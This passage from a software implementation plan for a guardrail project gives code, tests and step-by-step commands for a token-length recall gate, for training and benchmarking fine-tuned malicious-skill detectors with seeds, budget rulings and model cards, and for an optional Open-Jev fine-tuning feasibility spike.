        for p in write_cards(args.model, seeds, Path(args.models_dir), Path(args.results_dir), Path(args.docs_dir),
                             args.val_run, args.test_run, args.sd_run):
            print(p)
        return 0
```

- [ ] **Step 4: Run the whole suite**

Run: `uv run pytest -q`
Expected: all pass

- [ ] **Step 5: Commit**

```bash
git add nar_guardrails/train/card.py nar_guardrails/cli.py tests/test_card.py tests/test_cli.py
git commit -m "feat(train): model cards rendered from training manifests and benchmark runs"
```

---

### Task 9: Laya 512-token length gate (`nar_guardrails/train/gates.py`, `nar gate`)

**Files:**
- Create: `nar_guardrails/train/gates.py`
- Modify: `nar_guardrails/cli.py` (add `gate` subcommand)
- Test: `tests/test_gates.py`, `tests/test_cli.py`

**Interfaces:**
- Consumes: `nar_guardrails.bench.metrics.usable(items, verdicts) -> (y, scores, ids)`, `nar_guardrails.bench.thresholds.choose_thresholds(y, scores) -> {"f1": thr, ...}`, `nar_guardrails.report.tables.load_run(run_dir) -> {"manifest", "verdicts": {detector: [Verdict]}, "thresholds"}`, `nar_guardrails.report.build._items_for(run, data_dir)`.
- Produces: `recall_by_length(items, verdicts, threshold, n_tokens, cut=512) -> dict` with keys `short`, `long` (each `{"n", "recall"}`), `gap`; `laya_length_gate(run_dir, data_dir, detector, n_tokens, cut=512, max_gap=0.05, min_long=50) -> dict` adding `threshold`, `train_laya_multi: bool`; CLI `nar gate --run R --detector KEY [--tokenizer PATH] [--cut 512] [--max-gap 0.05]` printing the JSON.

Decision rule (spec §9): `train_laya_multi` is true when the recall gap short−long on malicious val items exceeds `max_gap` and at least `min_long` malicious items are longer than `cut` tokens.

- [ ] **Step 1: Write the failing tests**

`tests/test_gates.py`:

```python
import json
from pathlib import Path

from nar_guardrails.schema import Item, Verdict, write_jsonl
from nar_guardrails.train.gates import laya_length_gate, recall_by_length


def _items():
    """22 items: 11 short (10 words) and 11 long (600 words); in each half 5 malicious and 6 benign."""
    out = []
    for n in range(22):
        text = " ".join(["w"] * (600 if n >= 11 else 10))
        out.append(Item(id=f"i{n:02d}", track="skills", text=text, label=1 if (n % 11) < 5 else 0, split="val",
                        meta={"splits": {"MSD": "val"}}))
    return out


def _verdicts(items, long_score=0.2):
    """Short malicious score 0.9, long malicious `long_score`, benign 0.3: the F1 threshold on this set is 0.9
    (10/15 F1 at 0.9 ties 20/30 at 0.2 and the higher threshold wins), so long items fall below it."""
    def score(i):
        if not i.label:
            return 0.3
        return long_score if len(i.text) > 100 else 0.9
    return [Verdict(item_id=i.id, detector="laya-ft-seed0", policy="shared@x", p_malicious=score(i),
                    label=int(score(i) >= 0.5), latency_ms=1.0) for i in items]


def test_recall_by_length_splits_malicious_items_at_the_cut():
    items = _items()
    r = recall_by_length(items, _verdicts(items), 0.5, lambda t: len(t.split()), cut=512)
    assert r["short"] == {"n": 5, "recall": 1.0} and r["long"] == {"n": 5, "recall": 0.0} and r["gap"] == 1.0
    r2 = recall_by_length(items, _verdicts(items, long_score=0.9), 0.5, lambda t: len(t.split()))
    assert r2["gap"] == 0.0


def test_laya_length_gate_reads_run_and_decides(tmp_path: Path):
    items = _items()
    data = tmp_path / "data"
    data.mkdir()
    write_jsonl(data / "skills.jsonl", items)
    run = tmp_path / "results" / "skills-val-msd-ft"
    run.mkdir(parents=True)
    (run / "manifest.json").write_text(json.dumps({"run_id": "skills-val-msd-ft", "track": "skills", "split": "val",
                                                   "protocol": "MSD", "variant": "text"}))
    write_jsonl(run / "verdicts_laya-ft-seed0.jsonl", _verdicts(items))
    g = laya_length_gate(run, data, "laya-ft-seed0", lambda t: len(t.split()), cut=512, max_gap=0.05, min_long=3)
    assert g["threshold"] == 0.9 and g["gap"] == 1.0 and g["train_laya_multi"] is True
    g2 = laya_length_gate(run, data, "laya-ft-seed0", lambda t: len(t.split()), cut=512, max_gap=0.05, min_long=50)
    assert g2["train_laya_multi"] is False and "min_long" in g2["reason"]
```

Append to `tests/test_cli.py`:

```python
def test_cli_gate_prints_json(monkeypatch, capsys):
    import nar_guardrails.train.gates as gates
    monkeypatch.setattr(gates, "laya_length_gate", lambda *a, **k: {"gap": 0.01, "train_laya_multi": False})
    monkeypatch.setattr(gates, "token_counter", lambda path: (lambda t: len(t.split())))
    from nar_guardrails.cli import main
    assert main(["gate", "--run", "skills-val-msd-ft", "--detector", "laya-ft-seed0", "--tokenizer", "x"]) == 0
    assert '"train_laya_multi": false' in capsys.readouterr().out
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/test_gates.py tests/test_cli.py -k gate -q`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement**

`nar_guardrails/train/gates.py`:

```python
"""Post-training decision gates (spec §9): does Laya's 512-token cap cost more than 5 recall points on val?"""
from __future__ import annotations

from pathlib import Path
from typing import Callable

from nar_guardrails.bench.metrics import usable
from nar_guardrails.bench.thresholds import choose_thresholds
from nar_guardrails.schema import Item, Verdict


def token_counter(tokenizer_path: str) -> Callable[[str], int]:
    from transformers import AutoTokenizer

    tok = AutoTokenizer.from_pretrained(tokenizer_path)
    return lambda text: len(tok.encode(text, add_special_tokens=False))


def recall_by_length(items: list[Item], verdicts: list[Verdict], threshold: float, n_tokens: Callable[[str], int],
                     cut: int = 512) -> dict:
    """Recall on malicious items at `threshold`, split into texts of ≤ cut tokens and > cut tokens."""
    y, s, ids = usable(items, verdicts)
    by_id = {i.id: i for i in items}
    hits: dict[str, list[bool]] = {"short": [], "long": []}
    for yy, ss, iid in zip(y, s, ids):
        if yy != 1:
            continue
        hits["long" if n_tokens(by_id[iid].text) > cut else "short"].append(ss >= threshold)
    out = {name: {"n": len(h), "recall": (sum(h) / len(h)) if h else None} for name, h in hits.items()}
    rs, rl = out["short"]["recall"], out["long"]["recall"]
    out["gap"] = (rs - rl) if rs is not None and rl is not None else None
    return out


def laya_length_gate(run_dir: Path, data_dir: Path, detector: str, n_tokens: Callable[[str], int], cut: int = 512,
                     max_gap: float = 0.05, min_long: int = 50) -> dict:
    from nar_guardrails.report.build import _items_for
    from nar_guardrails.report.tables import load_run

    run = load_run(Path(run_dir))
    items = _items_for(run, Path(data_dir))
    verdicts = run["verdicts"].get(detector)
    if not verdicts:
        raise KeyError(f"no verdicts for {detector!r} in {run_dir}")
    y, s, _ = usable(items, verdicts)
    threshold = choose_thresholds(y, s)["f1"]
    out = recall_by_length(items, verdicts, threshold, n_tokens, cut)
    out.update(detector=detector, run=str(run_dir), cut=cut, threshold=threshold, max_gap=max_gap)
    if out["long"]["n"] < min_long:
        out.update(train_laya_multi=False, reason=f"only {out['long']['n']} malicious val items exceed {cut} tokens (min_long={min_long})")
    elif out["gap"] is not None and out["gap"] > max_gap:
        out.update(train_laya_multi=True, reason=f"recall gap {out['gap']:.3f} exceeds {max_gap}: train laya-multi-ft")
    else:
        out.update(train_laya_multi=False, reason=f"recall gap {out['gap']} within {max_gap}")
    return out
```

`nar_guardrails/cli.py`:

```python
    g = sub.add_parser("gate", help="Laya length gate: recall on val for texts above/below the token cap")
    g.add_argument("--run", required=True, help="validation run id, e.g. skills-val-msd-ft")
    g.add_argument("--detector", required=True, help="e.g. laya-ft-seed0")
    g.add_argument("--tokenizer", default=None, help="tokenizer path; default: the detector's model_id in configs/models.yaml")
    g.add_argument("--cut", type=int, default=512)
    g.add_argument("--max-gap", type=float, default=0.05)
    g.add_argument("--results-dir", default="results")
    g.add_argument("--data-dir", default="data/processed")
```

```python
    if args.cmd == "gate":
        from pathlib import Path
        from nar_guardrails.detectors import load_models_cfg
        from nar_guardrails.train import gates
        tok_path = args.tokenizer or load_models_cfg()[args.detector]["model_id"]
        out = gates.laya_length_gate(Path(args.results_dir) / args.run, Path(args.data_dir), args.detector,
                                     gates.token_counter(tok_path), cut=args.cut, max_gap=args.max_gap)
        print(json.dumps(out, indent=2))
        return 0
```

- [ ] **Step 4: Run the whole suite**

Run: `uv run pytest -q`
Expected: all pass

- [ ] **Step 5: Commit**

```bash
git add nar_guardrails/train/gates.py nar_guardrails/cli.py tests/test_gates.py tests/test_cli.py
git commit -m "feat(train): nar gate for Laya's 512-token cap decision"
```

---

### Task 10: Probe, train, evaluate, publish (operational — run by the controller in this session, not by a subagent)

**Files:**
- Produces (git-ignored): `models/probe/*`, `models/{laya-ft,gliner2-decide-ft,modernbert-ft}/seed{0,1,2}/{model,training_manifest.json,MODEL_CARD.md}`, `results/skills-{val-msd,test-msd,test-sd}-ft/*`
- Produces (committed): `docs/model-cards/*.md`, `docs/model-cards/training-set-MSD-train.json`, `docs/results/*.md|csv`, ledger entries
- Possibly modify: `configs/finetune.yaml` (budget rulings), `configs/models.yaml` (`laya-multi-ft-seed*` if the gate fires)

Nothing here needs a fresh context; it is a sequence of long-running commands, each verified by its outputs. Run them in the background with a log and a Monitor, one at a time (single MPS device).

- [ ] **Step 1: Confirm the zero-shot baseline has finished**

Run: `grep -c "EXIT=" results/bench.log` → must print `1`; `tail -n 3 results/bench.log` shows `EXIT=0`. If the bench is still running, wait; never start training alongside it.

Then run `make fetch-bases` once. It downloads the pinned base snapshots as files into the local Hub cache (Laya and GLiNER2.5-Decide are already cached; ModernBERT-large is new). This is the only step that touches the network; every later target exports `HF_HUB_OFFLINE=1`.

- [ ] **Step 2: Timing probe (64 items, 1 epoch, each model, seed 0)**

Run: `make finetune-probe > results/finetune-probe.log 2>&1` (background; Monitor for `Traceback|Error|Killed`). Then, per model, read `models/probe/<key>/seed0/training_manifest.json` → `started`/`finished` and compute seconds per item-epoch: `(finished - started) / 64`. Estimate a full seed as `seconds_per_item × 6818 × epochs`. Write the three estimates into the ledger.

Budget rule (ruling, record in ledger): a single seed may take at most 8 hours. If a model's estimate exceeds it, apply in order and re-estimate: `modernbert-ft` `max_tokens` 2048 → 1024; `laya-ft` `epochs` 3 → 2; `gliner2-decide-ft` `max_tokens` 1024 → 768. If still above 8 h, train seed 0 only for that model and record "1 seed (budget)" in the ledger and the card's limitations line. Any change goes into `configs/finetune.yaml` and is committed before Step 3.

Device failures: if the GLiNER2 probe fails with a device-mismatch `RuntimeError` on MPS, rerun that probe with `--device cpu --max-tokens 512`; if the CPU estimate is above 8 h per seed, record "gliner2-decide-ft: infeasible on this machine; not trained" in the ledger and continue with the other two models (no cloud fallback: local-only ruling). If the ModernBERT probe runs out of memory on MPS, set `batch_size: 2`, `gradient_accumulation_steps: 16` in `configs/finetune.yaml` and re-probe.

Also verify each probe checkpoint loads the way the adapters load it:

```bash
uv run python -c "import laya; a=laya.load('models/probe/laya-ft/seed0/model'); print(a.predict('hello', {'malicious': {'type': 'noul', 'instructions': 'q'}}))"
uv run python -c "from gliner2 import GLiNER2; m=GLiNER2.from_pretrained('models/probe/gliner2-decide-ft/seed0/model'); print(m.classify_text('hello', {'input_safety': {'malicious': 'a', 'benign': 'b'}}, include_confidence=True))"
uv run python -c "from transformers import AutoModelForSequenceClassification as M; print(M.from_pretrained('models/probe/modernbert-ft/seed0/model').config.id2label)"
```

The first two must print a prediction, the third `{0: 'benign', 1: 'malicious'}`. Delete `models/probe` afterwards.

- [ ] **Step 3: Full training**

Run: `make finetune > results/finetune.log 2>&1` in the background with a Monitor on `Traceback|Error|Killed|OOM|skip |training_manifest`. The target skips seeds whose manifest exists, so it is safe to re-run after an interruption. After it exits, `ls models/*/seed*/training_manifest.json` lists nine files (or fewer per the budget rulings).

- [ ] **Step 4: Evaluate and render cards**

Run: `make bench-ft > results/bench-ft.log 2>&1` (background + Monitor). Check:
- `results/skills-test-msd-ft/report.md` has the nine `*-ft-seed*` rows and a seed-aggregated table;
- `results/skills-test-msd-ft/manifest.json` shows the `claude-*` detectors as `skipped` (no key exported) or as run with cached verdicts reused from the baseline (key exported by the user); zero-shot detectors reuse their cached verdicts either way;
- `results/skills-test-sd-ft/manifest.json` has `"exclude": ["MSD:train", "MSD:val"]` and `n_items` = 298;
- `docs/model-cards/` holds nine per-seed cards, three aggregate cards and `training-set-MSD-train.json`.

- [ ] **Step 5: Laya length gate**

Run: `uv run nar gate --run skills-val-msd-ft --detector laya-ft-seed0 | tee results/laya-gate.json`. If `train_laya_multi` is true: append to `configs/models.yaml` three entries `laya-multi-ft-seed{0,1,2}` shaped like `laya-ft-seed0` with `model_id: models/laya-multi-ft/seed<N>/model`, `max_length: 8192`, `batch_size: 2`; run `make finetune FT_MODELS=laya-multi-ft` (seed 0 first; seeds 1–2 only if a seed fits the 8-hour budget); re-run `make bench-ft FT_MODELS="laya-ft gliner2-decide-ft modernbert-ft laya-multi-ft"`. Record the gate output in the ledger either way.

- [ ] **Step 6: Publish results into the repo and commit**

Run: `make publish-results`, then `uv run pytest -q`, then:

```bash
git add configs/finetune.yaml configs/models.yaml docs/model-cards docs/results
git commit -m "results: fine-tuned skill-track models, model cards and benchmark reports"
```

Report in the final message: per model the mean ± std recall/FPR on MSD test and on the SD held-out run at the frozen F1 threshold, the zero-shot baseline row for the same base model, wall-clock per seed, and every budget ruling.

---

### Task 11 (optional, last): Open-Jev-2B fine-tune feasibility spike

**Files:**
- Create: `research/2026-10-2x-openjev-finetune-spike.md` (findings)
- Uses (git-ignored): `external/open-jev/` checkout with its own virtualenv

This is a spike: the deliverable is a decision, not code. Open-Jev's trainer is `python -m jev.train` from a Git checkout (`pip install -e '.[train]'`); its training-record schema is undocumented and its README gives no CPU/MPS training guidance. The spec makes this model optional and conditional on the base model's smoke test, which has not run (no SystemOne server has been started).

- [ ] **Step 1: Start the base server and run the harness smoke** (`scripts/systemone_servers.md` has the commands). If the base `openjev-2b` detector does not pass `uv run nar smoke --detectors openjev-2b`, write "base smoke failed: <reason>" in the findings file and stop here.

- [ ] **Step 2: Inspect the trainer** — clone `https://github.com/Zefan-Cai/Open-Jev` into `external/open-jev` at the commit the model card for `ZefanCai/Open-Jev-2B` (revision `0c7aa498b1627be8da4acf34c863ff0ee0a92785`) names; create `external/open-jev/.venv` with `uv venv` and `uv pip install -e '.[train]'` **inside that venv only** (the lab venv keeps transformers 5.20); read `jev/train.py` and the data loader it imports; write down the exact record schema, the LoRA/head options, and whether the loop moves tensors to `mps`.

- [ ] **Step 3: 20-step probe** — convert 64 MSD-train items into that schema with the detector's noul question (same text as `LayaDetector.build_questions`), run `python -m jev.train --model Qwen/Qwen3.5-2B --revision <pinned> --data <converted> --output external/open-jev/runs/probe --steps 20 --max-length 1024` on MPS, and time it. Note peak memory from `top`/Activity Monitor.

- [ ] **Step 4: Decide and record** — in the findings file: feasible on M4 only if 20 steps complete without OOM and the extrapolated 1-epoch run (6,818 items, max length 4,096 per spec) is under 12 hours; otherwise record it as infeasible on this machine and stop (no cloud fallback: local-only ruling). Add the ruling to the ledger. If feasible, the training recipe gets its own short plan (converter module + `openjev` trainer + packaging via the repo's checkpoint packager + `openjev-2b-ft-seed0` server entry); do not implement it inside this task.

---

## Self-review

- **Spec coverage (§9):** MSD train / val thresholds / MSD+SD test — Tasks 1, 2, 7, 10. Three seeds — Task 3 keys, Task 10 Makefile loop. Checkpoints under `models/<key>/seed<N>/` with a training log — manifest + `result`/`log_history` (Tasks 4–7). Registered as detectors — Task 3. `laya-ft` recipe (noul question, encoder + head, 1–3 epochs, calibration, 512 tokens, laya-multi gate) — Tasks 4, 9, 10. `gliner2-decide-ft` (ExtractorTrainer + LoRA, two labels, 1,024 tokens, 2 epochs) — Task 5. `modernbert-ft` (AutoModelForSequenceClassification, 2,048 tokens, lr 2e-5, 2 epochs, fp32 MPS, batch 4 + accumulation) — Task 6. `openjev-2b-ft` optional — Task 11. Fallbacks (CPU with reduced length, cloud GPU, hardware recorded) — Task 10 Step 2 and the manifest's `environment`/`device` fields. User requirements (dataset record, original model-card link, 2025–2026 data) — Tasks 7, 8.
- **Deviation recorded as a ruling:** the spec says "evaluate on SD test"; 1,189 of 1,487 SD-test items are MSD-train/val items, so the SD run excludes them (298 items) via `--exclude-split`. The alternative — a second set of models trained on SD train — doubles compute and is not what §9 asks for. Laya's temperature calibration uses the library's held-out slice of train (400 items) rather than val, so val thresholds are not fitted on calibration data. The spec's cloud-GPU and Kaggle fallbacks are withdrawn by the user's local-only ruling; the plan replaces them with reduced budgets or "not trained", and the only network step is the one-time `nar fetch-bases` file download.
- **Placeholder scan:** no TBD/TODO; every code step carries the code; Task 10/11 are operational by design and carry exact commands and decision rules.
- **Type consistency:** every trainer is `(train, val, policy, seed_dir, seed, hp, base_dir, device)`; `run.train` dispatches by `hp["trainer"]` ∈ {laya, gliner2, modernbert}; detector keys and `models/<key>/seed<N>/model` paths agree across Tasks 3, 7, 8, 9, 10; `checkpoint_revision` lives in `detectors/base.py` and is re-exported by `train/manifest.py`.
- **Review Focus:** leakage (Task 1 `assert_disjoint`, Task 2 exclusion, Task 7 refusal test), empty text (Tasks 4–6), missing checkpoint (Task 3), oversized text (Tasks 1, 5, 6), policy drift (Task 8 card asserts policy hash and text).
